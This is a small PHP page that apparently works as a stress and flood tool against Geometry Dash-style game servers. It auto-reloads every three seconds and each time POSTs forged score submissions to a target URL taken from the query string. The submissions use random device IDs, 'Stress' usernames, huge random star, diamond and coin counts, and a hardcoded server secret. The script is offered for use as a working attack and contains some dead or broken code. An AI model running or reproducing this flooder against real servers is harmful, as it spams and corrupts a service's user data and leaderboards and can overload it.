<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<style>
    .a {
        display: inline-block;
        padding: 5px;
        border: 1px solid black;
    }
</style>
<p>Response:</p>
<?php
echo "<script>
function a() {
location.reload();
}
setTimeout(a, 3000);
</script>";
function generate($how_long)
{
    $length = $how_long;
    $chars = 'abdefhiknrstyzABDEFGHKNQRSTYZ23456789';
    $numChars = strlen($chars);
    $string = '';
    for ($i = 0; $i < $length; $i++) {
        $string .= substr($chars, rand(1, $numChars) - 1, 1);
    }
    return $string;
}
$r = random_int(1, 99999);
$is = $_GET["nick"];
$site = $_GET["site"];
$a = check($site, $r);
    echo "<div class='a'>$a $sb</div>";
$iss = $is + 1;


function check($s, $r)
{
    $k = $GLOBALS["key"];
    $rs = random_int(1000, 5043578);
    $length = 100;
    $chars = 'abdefhiknrstyzABDEFGHKNQRSTYZ23456789';
    $numChars = strlen($chars);
    $string = '';
    for ($i = 0; $i < $length; $i++) {
        $string .= substr($chars, rand(1, $numChars) - 1, 1);
    }
    if ($curl = curl_init()) {
        curl_setopt($curl, CURLOPT_URL, $s);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_POST, true);
        $p = "gameVersion=21&binaryVersion=35&gdw=0&udid=S1541365809568826933535056522735691$r&uuid=$r&userName=NUKE&stars=1000&demons=1000&diamonds=10000&icon=1&color1=1&color2=1&iconType=0&coins=55&userCoins=1000&special=2&gameVersion=21&secret=Wmfd2893gb7&accIcon=127&accShip=31&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1";
        $p = base64_encode($p);
        curl_setopt($curl, CURLOPT_POSTFIELDS, "gameVersion=21&binaryVersion=35&gdw=0&udid=S1541365809568826933535056522735691$r&uuid=$r&userName=Stress $r&stars=$rs&demons=$rs&diamonds=$rs&icon=1&color1=1&color2=1&iconType=0&coins=55&userCoins=$rs&special=2&gameVersion=21&secret=Wmfd2893gb7&accIcon=127&accShip=31&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1");
        $out = curl_exec($curl);
        return $out;
        curl_close($curl);
    }
}
?>
